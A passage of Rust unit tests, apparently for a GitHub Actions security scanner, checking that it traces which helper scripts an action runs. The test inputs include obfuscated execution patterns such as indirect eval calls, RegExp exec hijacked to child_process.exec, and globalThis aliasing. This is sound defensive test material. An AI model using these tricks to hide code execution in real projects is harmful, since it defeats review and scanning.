            "eval?.(\"require('../../shared/helper.js')\")",
            "(Function)(\"require('../../shared/helper.js')\")()",
            "(0, eval)(\"require('../../shared/helper.js')\")",
            "((eval))(\"require('../../shared/helper.js')\")",
            "eval.call(null, \"require('../../shared/helper.js')\")",
            "eval?.call(null, \"require('../../shared/helper.js')\")",
            "(eval).call(null, \"require('../../shared/helper.js')\")",
            "(eval)?.call(null, \"require('../../shared/helper.js')\")",
            "eval.bind(null)(\"require('../../shared/helper.js')\")",
            "eval?.bind(null)(\"require('../../shared/helper.js')\")",
            "(eval).bind(null)(\"require('../../shared/helper.js')\")",
            "(eval)?.bind(null)(\"require('../../shared/helper.js')\")",
        ] {
            let mut indirect_targets = vec![(
                "action/dist/index.js".to_string(),
                SourceFileKind::JavaScript,
            )];
            assert!(force_include_remote_source_dependencies(
                &tree,
                true,
                "action",
                &mut indirect_targets,
                &[Some(Ok(source.to_string()))]
            ));
            assert!(
                indirect_targets
                    .contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript)),
                "source: {source}"
            );
        }

        for source in [
            "eval.apply(null, [\"require('../../shared/helper.js')\"])",
            "eval?.apply(null, [\"require('../../shared/helper.js')\"])",
            "(eval).apply(null, [\"require('../../shared/helper.js')\"])",
            "(eval)?.apply(null, [\"require('../../shared/helper.js')\"])",
            "eval[\"call\"](null, \"require('../../shared/helper.js')\")",
            "eval?.[\"bind\"](null)(\"require('../../shared/helper.js')\")",
            "(eval)[\"call\"](null, \"require('../../shared/helper.js')\")",
            "(eval)?.[\"apply\"](null, [\"require('../../shared/helper.js')\"])",
            r#"eval.c\u0061ll(null, "require('../../shared/helper.js')")"#,
            r#"(eval)?.c\u0061ll(null, "require('../../shared/helper.js')")"#,
        ] {
            let mut indirect_targets = vec![(
                "action/dist/index.js".to_string(),
                SourceFileKind::JavaScript,
            )];
            assert!(!force_include_remote_source_dependencies(
                &tree,
                true,
                "action",
                &mut indirect_targets,
                &[Some(Ok(source.to_string()))]
            ));
        }

        let mut function_bind_alias = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut function_bind_alias,
            &[Some(Ok("const bind = Function.bind;".to_string()))]
        ));
    }

    #[test]
    fn remote_dependencies_are_resolved_against_the_tree() {
        let tree = vec![
            tree_entry("action/dist/index.js", "blob"),
            tree_entry("shared/helper.js", "blob"),
        ];
        let mut targets = vec![(
            "action/dist/index.js".to_string(),
            SourceFileKind::JavaScript,
        )];
        let contents = vec![Some(Ok(
            "require('../../shared/helper'); /* require('../../missing.js') */".to_string(),
        ))];

        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut targets,
            &contents
        ));
        assert!(targets.contains(&("shared/helper.js".to_string(), SourceFileKind::JavaScript)));
    }

    #[test]
    fn remote_workspace_relative_action_is_not_mapped_to_parent_repository() {
        let parent = ActionRef {
            owner: "owner".into(),
            repo: "action".into(),
            subpath: None,
            ref_string: "0123456789abcdef0123456789abcdef01234567".into(),
            ref_type: workflow::RefType::Sha,
            tag_comment: None,
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };

        assert!(nested_local_action(&parent, "./consumer-action").is_none());
        assert_eq!(
            nested_local_action(&parent, "$/repository-action").and_then(|action| action.subpath),
            Some("repository-action".to_string())
        );
        assert_eq!(
            nested_local_action(&parent, "$/repository-action/").and_then(|action| action.subpath),
            Some("repository-action".to_string())
        );
        assert!(nested_local_action(&parent, "$//repository-action").is_none());
    }

    #[test]
    fn reusable_workflow_local_children_are_repository_bound() {
        let mut collector = AuditCollector::new(false);
        let nested = scan_reusable_workflow(
            "jobs:\n  child:\n    uses: ./.github/workflows/child.yml\n",
            ".github/workflows/parent.yml",
            "owner/repo",
            &mut collector,
            &DEFAULT_CONFIG,
        );
        assert!(nested.complete);
        assert_eq!(
            nested.local,
            vec!["$/.github/workflows/child.yml".to_string()]
        );
    }

    #[test]
    fn docker_copy_sources_preserve_local_inputs() {
        let (sources, complete) = docker_local_source_paths(
            "COPY entrypoint.sh /entrypoint.sh\nCOPY [\"src/tool.py\", \"/tool.py\"]\nCOPY --from=builder /bin/tool /bin/tool\n",
        );
        assert!(complete);
        assert_eq!(sources, vec!["entrypoint.sh", "src/tool.py"]);
    }

    #[test]
    fn extensionless_composite_helper_is_scanned_as_shell() {
        let yaml: Value = serde_norway::from_str(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: $GITHUB_ACTION_PATH/helper\n",
        )
        .unwrap();
        assert!(action_yml_runtime_paths_complete(&yaml, "action"));
        assert_eq!(
            helper_paths(&yaml, "action"),
            vec![("action/helper".to_string(), SourceFileKind::Shell)]
        );
    }

    #[test]
    fn quoted_action_roots_and_interpreter_helpers_are_followed() {
        for command in [
            "bash \"$GITHUB_ACTION_PATH\"/install.sh",
            "bash \"${GITHUB_ACTION_PATH}\"/install.sh",
            "bash \"${{github.action_path}}\"/install.sh",
            "bash ${{github.action_path}}/install.sh",
            "cd \"$GITHUB_ACTION_PATH\" && bash install.sh",
            "cd \"$GITHUB_ACTION_PATH\"\nbash -e install.sh",
        ] {
            let yaml = serde_norway::to_value(serde_json::json!({"runs": {"using":"composite", "steps":[{"shell":"bash", "run":command}]}})).unwrap();
            assert_eq!(
                helper_paths(&yaml, "action"),
                vec![("action/install.sh".to_string(), SourceFileKind::Shell)],
                "{command}"
            );
            assert!(
                action_yml_runtime_paths_complete(&yaml, "action"),
                "{command}"
            );
        }
        let yaml = serde_norway::to_value(serde_json::json!({"runs":{"using":"composite", "steps":[{"shell":"bash", "working-directory":"${{github.action_path}}", "run":"bash $HELPER"}]}})).unwrap();
        assert!(!action_yml_runtime_paths_complete(&yaml, "action"));
    }

    #[test]
    fn sibling_python_imports_are_followed_without_requiring_external_packages() {
        let tree = vec![
            tree_entry("action/main.py", "blob"),
            tree_entry("action/utils.py", "blob"),
            tree_entry("action/helpers/__init__.py", "blob"),
        ];
        for source in [
            "import utils",
            "import os, utils as u",
            "from utils import run",
            "import helpers",
        ] {
            let mut targets = vec![("action/main.py".to_string(), SourceFileKind::Python)];
            let contents = vec![Some(Ok(source.to_string()))];
            assert!(
                force_include_remote_source_dependencies(
                    &tree,
                    true,
                    "action",
                    &mut targets,
                    &contents
                ),
                "{source}"
            );
            assert_eq!(targets.len(), 2, "{source}");
        }
    }

    #[test]
    fn python_package_initializers_and_multiline_members_are_followed() {
        let tree = vec![
            tree_entry("action/main.py", "blob"),
            tree_entry("action/helpers/__init__.py", "blob"),
            tree_entry("action/helpers/child.py", "blob"),
        ];
        for source in [
            "import helpers.child",
            "from helpers import (\n child,\n)",
            "from helpers import child as helper",
        ] {
            let mut targets = vec![("action/main.py".to_string(), SourceFileKind::Python)];
            assert!(force_include_remote_source_dependencies(
                &tree,
                true,
                "action",
                &mut targets,
                &[Some(Ok(source.to_string()))]
            ));
            assert!(
                targets
                    .iter()
                    .any(|(path, _)| path == "action/helpers/__init__.py"),
                "{source}"
            );
            assert!(
                targets
                    .iter()
                    .any(|(path, _)| path == "action/helpers/child.py"),
                "{source}"
            );
        }
    }

    #[test]
    fn dirname_helpers_are_followed_with_or_without_an_interpreter() {
        let tree = vec![
            tree_entry("action/main.sh", "blob"),
            tree_entry("action/helper.sh", "blob"),
        ];
        for source in [
            r#""$(dirname "$0")/helper.sh""#,
            r#"bash "$(dirname "$0")/helper.sh""#,
            r#"source "$(dirname "${BASH_SOURCE[0]}")/helper.sh""#,
        ] {
            let mut targets = vec![("action/main.sh".to_string(), SourceFileKind::Shell)];
            assert!(
                force_include_remote_source_dependencies(
                    &tree,
                    true,
                    "action",
                    &mut targets,
                    &[Some(Ok(source.to_string()))]
                ),
                "{source}"
            );
            assert_eq!(targets.len(), 2, "{source}");
        }
    }

    fn composite_yaml(shell: &str, run: &str, env: Option<(&str, &str)>) -> Value {
        let mut step = serde_json::json!({"shell": shell, "run": run});
        if let Some((name, value)) = env {
            step["env"] = serde_json::json!({ name: value });
        }
        serde_norway::to_value(serde_json::json!({"runs": {"using": "composite", "steps": [step]}}))
            .unwrap()
    }

    #[test]
    fn composite_steps_resolve_env_powershell_and_module_action_paths() {
        for (shell, run, env) in [
            (
                "bash",
                "bash \"$SCRIPT\"",
                Some(("SCRIPT", "${{ github.action_path }}/install.sh")),
            ),
            (
                "pwsh",
                "& $env:SCRIPT",
                Some(("SCRIPT", "$GITHUB_ACTION_PATH/install.sh")),
            ),
            ("pwsh", "& \"$env:GITHUB_ACTION_PATH/install.sh\"", None),
            ("pwsh", "& \"${env:github_action_path}/install.sh\"", None),
            (
                "pwsh",
                "& (Join-Path $env:GITHUB_ACTION_PATH install.sh)",
                None,
            ),
        ] {
            let yaml = composite_yaml(shell, run, env);
            assert_eq!(
                helper_paths(&yaml, "action"),
                vec![("action/install.sh".to_string(), SourceFileKind::Shell)],
                "{run}"
            );
            assert!(action_yml_runtime_paths_complete(&yaml, "action"), "{run}");
        }
        let yaml = composite_yaml(
            "bash",
            "cd \"$GITHUB_ACTION_PATH\" && python3 -m tools.helper",
            None,
        );
        assert_eq!(
            helper_paths(&yaml, "action"),
            vec![
                ("action/tools/helper.py".to_string(), SourceFileKind::Python),
                (
                    "action/tools/helper/__main__.py".to_string(),
                    SourceFileKind::Python
                )
            ]
        );
    }

    #[test]
    fn unresolved_action_path_execution_is_incomplete_but_mentions_are_not() {
        for (shell, run) in [
            ("bash", "bash \"$GITHUB_ACTION_PATH\"/$NAME"),
            ("bash", "\"$GITHUB_ACTION_PATH\"/$TOOL --flag"),
            ("pwsh", "& $env:GITHUB_ACTION_PATH"),
            ("bash", "source \"${{ github.action_path }}\""),
        ] {
            assert!(
                !action_yml_runtime_paths_complete(&composite_yaml(shell, run, None), "action"),
                "{run}"
            );
        }
        for (shell, run, env) in [
            ("bash", "echo \"Using $GITHUB_ACTION_PATH\"", None),
            ("bash", "ls \"$GITHUB_ACTION_PATH\"", None),
            (
                "pwsh",
                "Write-Host \"Action at $env:GITHUB_ACTION_PATH\"",
                None,
            ),
            ("bash", "bash -c 'echo $NAME'", Some(("NAME", "hello"))),
            ("bash", "python3 -m pip install pip==24.0", None),
        ] {
            let yaml = composite_yaml(shell, run, env);
            assert!(helper_paths(&yaml, "action").is_empty(), "{run}");
            assert!(action_yml_runtime_paths_complete(&yaml, "action"), "{run}");
        }
    }

    fn helper_paths(yaml: &Value, base: &str) -> Vec<(String, SourceFileKind)> {
        composite_helpers(yaml, base)
            .0
            .into_iter()
            .map(|helper| (helper.path, helper.kind))
            .collect()
    }

    fn helper_references(yaml: &Value) -> Vec<String> {
        helper_paths(yaml, "action")
            .into_iter()
            .map(|(path, _)| path.strip_prefix("action/").unwrap_or(&path).to_string())
            .collect()
    }

    fn follow(tree: &[&str], entry: &str, source: &str) -> (bool, Vec<String>) {
        let (complete, targets) = follow_kinds(tree, entry, source);
        (
            complete,
            targets.into_iter().map(|(path, _)| path).collect(),
        )
    }

    fn follow_kinds(
        tree: &[&str],
        entry: &str,
        source: &str,
    ) -> (bool, Vec<(String, SourceFileKind)>) {
        let tree: Vec<_> = tree.iter().map(|path| tree_entry(path, "blob")).collect();
        let kind = executable_source_kind(entry).unwrap();
        let mut targets = vec![(entry.to_string(), kind)];
        let complete = force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut targets,
            &[Some(Ok(source.to_string()))],
        );
        (complete, targets.into_iter().skip(1).collect())
    }

    const LOCATED_TREE: [&str; 9] = [
        "action/index.js",
        "action/main.py",
        "action/main.sh",
        "action/main.ps1",
        "action/install.sh",
        "action/install.js",
        "action/sub/install.sh",
        "action/sub/install.ps1",
        "action/helper.py",
    ];

    #[test]
    fn located_executions_bind_the_whole_executed_path() {
        for (entry, source, expected) in [
            (
                "action/index.mjs",
                "import { createRequire } from 'node:module';\nconst load = createRequire(import.meta.url);\nconst path = load('node:path');\nexecFileSync('bash', [path.join(import.meta.dirname, 'install.sh')]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nlet k = 'other';\nk = 'bucket';\nexecFileSync('bash', [globalThis[k].file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function run(k) { execFileSync('bash', [globalThis[k].file]); }\nglobalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nrun('bucket');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function run(k) { globalThis[k].file = __dirname + '/install.sh'; execFileSync('bash', [globalThis[k].file]); }\nglobalThis.bucket = {};\nrun('bucket');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nconst g = globalThis;\ng.bucket.file = __dirname + '/install.sh';\nexecFileSync('bash', [globalThis.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst k = `bucket`;\nexecFileSync('bash', [globalThis[k].file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst k = 'bucket';\nexecFileSync('bash', [globalThis[k].file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nconst k = 'bucket';\nglobalThis[k].file = __dirname + '/install.sh';\nexecFileSync('bash', [globalThis.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst { globalThis: g } = globalThis;\nexecFileSync('bash', [g.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst { g } = { g: globalThis };\nexecFileSync('bash', [g.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst g = global.globalThis;\nexecFileSync('bash', [g.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nlet g = {};\ng = globalThis;\nexecFileSync('bash', [g.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst g = (function () { return this; })();\nexecFileSync('bash', [g.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.p = (function () { return this; })();\nglobalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nexecFileSync('bash', [p.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.list = [];\nlist.push(globalThis);\nglobalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nexecFileSync('bash', [list[0].bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function T() {}\nT.prototype.run = function () { execFileSync('bash', [this.file]); };\nconst t = new T();\nt.file = __dirname + '/install.sh';\nt.run();",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nconst box = { g: globalThis };\nconst g = box.g;\ng.bucket.file = __dirname + '/install.sh';\nexecFileSync('bash', [globalThis.bucket.file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const { RegExp: R } = globalThis;\nR.prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const key = 'RegExp';\nglobalThis[key].prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const key = process.argv[2];\nglobalThis[key].prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const key = process.argv[2];\nconst { [key]: R } = globalThis;\nR.prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "Object.defineProperty(globalThis, 'Symbol', { value: { for: () => 'RegExp' } });\nconst key = Symbol.for('origin');\nglobalThis[key].prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "Symbol = () => 'RegExp';\nglobalThis[Symbol('key')].prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "globalThis[Symbol.name] = () => 'RegExp';\nglobalThis[Symbol('key')].prototype.exec = require('child_process').execSync;\n/x/.exec('sh ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const o = { length: __dirname + '/install.sh' };\nconst file = o.length;\nexecFileSync('bash', [file]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\nmatcher['__defineGetter__']('exec', () => cp.exec);\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\nObject.defineProperty(matcher.valueOf(), 'exec', { value: cp.exec });\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\nconst receiver = { replace(regex) { regex.exec = cp.exec; } };\nreceiver.replace(matcher);\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\neval('RegExp.prototype.exec = cp.exec');\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nRegExp.prototype.exec = cp.exec;\nnew RegExp('noop').exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nRegExp.prototype.exec = cp.exec;\n/noop/.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nfunction run(matcher) {\n  matcher.exec = cp.exec;\n  matcher.exec(`bash \"${__dirname}/install.sh\"`);\n}\nrun(/noop/);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst holder = { matcher: /noop/ };\nholder.matcher.exec = cp.exec;\nholder.matcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\nmatcher.exec = cp.exec;\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst matcher = /noop/;\nObject.getPrototypeOf(/other/).exec = cp.exec;\nmatcher.exec(`bash \"${__dirname}/install.sh\"`);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "execFileSync('bash', [process['env'].GITHUB_ACTION_PATH + '/install.sh']);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const { env } = require('node:process');\nexecFileSync('bash', [env.GITHUB_ACTION_PATH + '/install.sh']);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function all(text, pattern) { return pattern.exec(text); }\nall(path.join(__dirname, 'install.sh'), runner);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "process.env.TOOL = path.join(__dirname, 'install.sh');\nexecFileSync('bash', [process.env.TOOL]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function __nccwpck_require__(id) {}\n__nccwpck_require__.ab = __dirname + '/';\nexecFileSync('bash', [__nccwpck_require__.ab + 'install.sh']);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "class Runner {\n  constructor() { this.script = path.join(__dirname, 'install.sh'); }\n  run() { execFileSync('bash', [this.script]); }\n}",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "import { execFileSync as run } from 'node:child_process';\nrun('bash', [new URL('./install.sh', import.meta.url).pathname]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "function run(dir) { execFileSync('bash', [dir + '/install.sh']); }\nrun(__dirname);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const helper = path.join(__dirname, 'sub', 'install.sh');\nexecFileSync('bash', [helper]);",
                "action/sub/install.sh",
            ),
            (
                "action/index.js",
                "const dir = path.join(\n  __dirname,\n  'sub'\n);\nspawnSync('bash', [path.join(dir, 'install.sh')]);",
                "action/sub/install.sh",
            ),
            (
                "action/index.js",
                "execFileSync('bash', ['install.sh'], { cwd: path.join(__dirname, 'sub') });",
                "action/sub/install.sh",
            ),
            (
                "action/index.js",
                "const config = { helper: __dirname + '/install.sh' };\nexecFileSync('bash', [config.helper]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const args = [__dirname + '/install.sh'];\nexecFileSync('bash', [...args]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "process.chdir(__dirname + '/sub');\nexecSync('bash install.sh');",
                "action/sub/install.sh",
            ),
            (
                "action/main.py",
                "subprocess.run(args=['bash', os.path.join(os.path.dirname(__file__), 'sub', 'install.sh')])",
                "action/sub/install.sh",
            ),
            (
                "action/main.py",
                "HERE = Path(__file__).resolve().parent\nsubprocess.run(['bash', str(HERE / 'sub' / 'install.sh')], check=True)",
                "action/sub/install.sh",
            ),
            (
                "action/main.py",
                "here = os.path.dirname(os.path.abspath(__file__))\nos.system(f'bash {here!s}/sub/install.sh')",
                "action/sub/install.sh",
            ),
            (
                "action/main.py",
                "subprocess.run(['bash', 'install.sh'], cwd=os.path.join(os.path.dirname(__file__), 'sub'))",
                "action/sub/install.sh",
            ),
            (
                "action/main.py",
                "import os; import helper",
                "action/helper.py",
            ),
            (
                "action/main.sh",
                "cd \"$(dirname \"$0\")/sub\"\nbash install.sh",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "DIR=$(dirname \"$0\")\nDIR=\"$DIR/sub\"\nbash \"$DIR/install.sh\"",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "env bash \"$(dirname \"$0\")/sub/install.sh\"",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "timeout 60 bash \"$(dirname \"$0\")/sub/install.sh\"",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "cat \"$(dirname \"$0\")/sub/install.sh\" | bash",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "cd \"$(dirname \"$0\")\"\nsh -c 'bash sub/install.sh'",
                "action/sub/install.sh",
            ),
            (
                "action/main.sh",
                "bash \"$GITHUB_ACTION_PATH/sub/install.sh\"",
                "action/sub/install.sh",
            ),
            (
                "action/main.ps1",
                "$dir = Join-Path $PSScriptRoot 'sub'\npwsh -File (Join-Path $dir 'install.ps1')",
                "action/sub/install.ps1",
            ),
            (
                "action/index.js",
                "const runner = require('child_process');\nrunner.exec('bash ' + __dirname + '/install.sh');",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "const root = __dirname;\nexecFileSync('bash', [path.join(root, '/install.sh')]);",
                "action/install.sh",
            ),
            (
                "action/index.js",
                "execFileSync('node', ['--require', './install.js', '-e', '0'], { cwd: __dirname });",
                "action/install.js",
            ),
            (
                "action/index.js",
                "const a0 = __dirname;\nconst a1 = a0;\nconst a2 = a1;\nconst a3 = a2;\nconst a4 = a3;\nconst a5 = a4;\nconst a6 = a5;\nconst a7 = a6;\nconst a8 = a7;\nconst a9 = a8;\nconst a10 = a9;\nconst a11 = a10;\nconst a12 = a11;\nconst a13 = a12;\nconst a14 = a13;\nconst a15 = a14;\nconst a16 = a15;\nconst a17 = a16;\nconst a18 = a17;\nexecFileSync('bash', [a18 + '/install.sh']);",
                "action/install.sh",
            ),
            (
                "action/main.sh",
                "cd \"$GITHUB_ACTION_PATH\"\n(cd /tmp)\nbash install.sh",
                "action/install.sh",
            ),
            (
                "action/main.sh",
                "cd \"$(dirname \"$0\")\"\nsh -c 'cd sub && bash install.sh'",
                "action/sub/install.sh",
            ),
            (
                "action/index.js",
                "const cp = require('child_process');\nconst helper = `${__dirname}/sub/install.sh`;\ncp.exec(helper);",
                "action/sub/install.sh",
            ),
        ] {
            assert_eq!(
                follow(&LOCATED_TREE, entry, source),
                (true, vec![expected.to_string()]),
                "{source}"
            );
        }
    }

    #[test]
    fn followed_helpers_start_in_their_callers_directory() {
        let tree: Vec<_> = [
            "action/main.sh",
            "action/scripts/helper.sh",
            "action/scripts/child.sh",
            "action/child.sh",
        ]
        .iter()
        .map(|path| tree_entry(path, "blob"))
        .collect();
        let mut targets = vec![("action/main.sh".to_string(), SourceFileKind::Shell)];
        let mut contents = vec![Some(Ok(
            "cd \"$GITHUB_ACTION_PATH/scripts\"\nbash helper.sh\n".to_string(),
        ))];
        let mut contexts = HashMap::new();
        loop {
            let before = (targets.len(), contexts.clone());
            assert!(follow_source_dependencies(
                &tree,
                true,
                "action",
                &mut targets,
                &contents,
                &mut contexts,
                &mut HashSet::new(),
            ));
            while contents.len() < targets.len() {
                contents.push(Some(Ok(match targets[contents.len()].0.as_str() {
                    "action/scripts/helper.sh" => "bash child.sh\n".to_string(),
                    _ => String::new(),
                })));
            }
            if before == (targets.len(), contexts.clone()) {
                break;
            }
        }
        let followed: Vec<_> = targets.iter().map(|(path, _)| path.as_str()).collect();
        assert_eq!(
            followed,
            [
                "action/main.sh",
                "action/scripts/helper.sh",
                "action/scripts/child.sh"
            ]
        );
    }

    #[test]
    fn located_executions_scan_as_the_interpreter_that_runs_them() {
        let tree = ["action/index.js", "action/install.txt", "action/tool"];
        for (source, expected) in [
            (
                "execFileSync('bash', [path.join(__dirname, 'install.txt')]);",
                ("action/install.txt", SourceFileKind::Shell),
            ),
            (
                "fork(path.join(__dirname, 'tool'));",
                ("action/tool", SourceFileKind::JavaScript),
            ),
            (
                "execFileSync(path.join(__dirname, 'tool'));",
                ("action/tool", SourceFileKind::Shell),
            ),
            // Run by another interpreter, a file keeps its own scan too.
            (
                "execFileSync('bash', [__filename]);",
                ("action/index.js", SourceFileKind::Shell),
            ),
        ] {
            assert_eq!(
                follow_kinds(&tree, "action/index.js", source),
                (true, vec![(expected.0.to_string(), expected.1)]),
                "{source}"
            );
        }
    }

    #[test]
    fn unbindable_located_executions_fail_closed() {
        for (entry, source) in [
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nconst box = { g: globalThis };\nconst g = box.g;\nexecFileSync('bash', [g.bucket.file]);",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nexecFileSync('bash', [Object.values(globalThis.bucket)[0]]);",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nfunction get() { return globalThis.bucket; }\nexecFileSync('bash', [Object.values(get())[0]]);",
            ),
            (
                "action/index.js",
                "globalThis.bucket = {};\nglobalThis.bucket.file = __dirname + '/install.sh';\nglobalThis.bucket.run = function () { execFileSync('bash', [Object.values(this)[0]]); };\nglobalThis.bucket.run();",
            ),
            (
                "action/index.js",
                "process.env.SCRIPT = __dirname + '/install.sh';\nfor (const [key, value] of Object.entries(process.env)) execFileSync('bash', [value]);",
            ),
            (
                "action/index.js",
                "process.env.SCRIPT = __dirname + '/install.sh';\nconst env = { ...process.env };\nexecFileSync('bash', [env.SCRIPT]);",
            ),
            (
                "action/index.js",
                "const key = process.argv[2];\nprocess.env[key] = __dirname + '/install.sh';\nconst g = (function () { return this; })();\nexecFileSync('bash', [g.process.env[key]]);",
            ),
            (
                "action/index.js",
                "file = __dirname + '/install.sh';\nexecFileSync('bash', [(function () { return this; })().file]);",
            ),
            (
                "action/index.js",
                "function run() { execFileSync('bash', [this.file]); }\nconst o = { file: __dirname + '/install.sh' };\nrun.call(o);",
            ),
            (
                "action/index.js",
                "function run() { execFileSync('bash', [this.file]); }\nconst o = { file: __dirname + '/install.sh' };\nconst bound = run.bind(o);\nbound();",
            ),
            (
                "action/index.js",
                "function run() { execFileSync('bash', [this.file]); }\nconst o = { file: __dirname + '/install.sh' };\nReflect.apply(run, o, []);",
            ),
            (
                "action/index.js",
                "const o = { file: __dirname + '/install.sh' };\n[1].forEach(function () { execFileSync('bash', [this.file]); }, o);",
            ),
            (
                "action/index.js",
                "const o = {};\no.file = __dirname + '/install.sh';\no.run = function () { execFileSync('bash', [Object.values(this)[0]]); };\no.run();",
            ),
            (
                "action/index.js",
                "function T() { this.file = __dirname + '/install.sh'; }\nT.prototype.run = function () { execFileSync('bash', [Object.values(this)[0]]); };\nnew T().run();",
            ),
            (
                "action/index.js",
                "const o = { init() { this.file = __dirname + '/install.sh'; } };\no.init();\nexecFileSync('bash', [Object.values(o)[0]]);",
            ),
            (
                "action/index.js",
                "function init() { this.file = __dirname + '/install.sh'; }\nconst o = {};\ninit.call(o);\nexecFileSync('bash', [Object.values(o)[0]]);",
            ),
            (
                "action/index.js",
                "const o = { get file() { return __dirname + '/install.sh'; } };\nexecFileSync('bash', [Object.values(o)[0]]);",
            ),
            (
                "action/index.js",
                "const o = { file: __dirname + '/install.sh' };\nObject.defineProperty(o, 'run', { get() { execFileSync('bash', [Object.values(this)[0]]); } });\nvoid o.run;",
            ),
            (
                "action/index.js",
                "const callbacks = { run: function () { execFileSync('bash', [this.file]); } };\nconst o = { file: __dirname + '/install.sh' };\n[1].forEach(callbacks.run, o);",
            ),
            (
                "action/index.js",
